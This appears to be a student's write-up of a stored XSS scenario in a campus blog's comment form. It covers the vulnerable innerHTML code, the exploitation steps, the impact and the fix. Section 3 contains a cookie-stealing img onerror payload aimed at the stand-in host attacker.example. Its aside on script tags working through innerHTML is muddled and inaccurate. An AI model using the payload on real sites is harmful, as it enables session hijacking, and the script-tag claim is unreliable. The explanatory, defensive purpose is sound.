# Q2 — Real-World XSS Scenario (Stored XSS in a Comment Section)

## 1. The scenario

A small campus blog lets students post comments under articles. The comment
form has one field (`message`) and the comments are shown to everyone who
opens the article. The frontend renders each comment like this:

```js
// vulnerable code
commentList.innerHTML += '<p>' + commentFromServer + '</p>';
```

There is no validation on submit and no escaping on render. Whatever the user
types is saved to the database as-is and later injected into the page with
`innerHTML`.

## 2. The vulnerability

This is **Stored XSS** (persistent XSS). The malicious script is stored on the
server and executed every time a victim opens the infected article page.

Root cause:

1. User input is stored without sanitization.
2. User input is rendered with `innerHTML`, so it is parsed as HTML/JS.

The correct approach would be `textContent` or `createElement` +
`textContent`, which treats the input as plain text.

## 3. Exploitation process

Step 1 — Attacker posts a normal-looking comment containing a payload:

```html
Nice article! <img src="x" onerror="fetch('https://attacker.example/collect?c='+document.cookie)">
```

Or a shorter proof-of-concept that students usually demo first:

```html
<script>alert('XSS')</script>
```

Note: a plain `<script>` tag works here because the string goes through
`innerHTML` on some browsers only in certain contexts, so attackers commonly
use event-handler vectors like `<img onerror=...>` or `<svg onload=...>`,
which fire reliably.

Step 2 — The server saves the payload as a regular comment.

Step 3 — Victim (e.g. a lecturer or another student) opens the article page.
The browser loads the comment list and runs:

```js
commentList.innerHTML += '<p><img src="x" onerror="fetch(...)"></p>';
```

Step 4 — The `onerror` handler fires immediately because `src="x"` fails to
load. The victim's browser silently sends `document.cookie` (session ID) to
the attacker's server.

Step 5 — Attacker reuses the stolen session cookie to log in as the victim
(session hijacking), without needing the password.

## 4. Impact

- **Account takeover:** stolen session cookies let the attacker impersonate
  lecturers/admins and post or delete content.
- **Defacement & phishing:** attacker can inject fake login forms or
  redirect links into the page, since every visitor runs the script.
- **Malware distribution:** the script can load an external JS file that
  shows fake download buttons or keylogs form input.
- **Reputation damage:** the blog spreads the attack by itself — one stored
  payload hits every visitor, unlike reflected XSS which needs a tricked link.

## 5. Why this happens in real projects

This exact pattern is common when developers:

- use `innerHTML` for convenience to append list items,
- trust internal/small-scale apps ("only students use it anyway"),
- forget that escaping must happen on output, not just on input.

Fix: never render untrusted data with `innerHTML`. Use:

```js
const p = document.createElement('p');
p.textContent = commentFromServer;
commentList.appendChild(p);
```

plus server-side output encoding, `HttpOnly` + `SameSite` cookies, and a
Content Security Policy (CSP) as defense in depth.
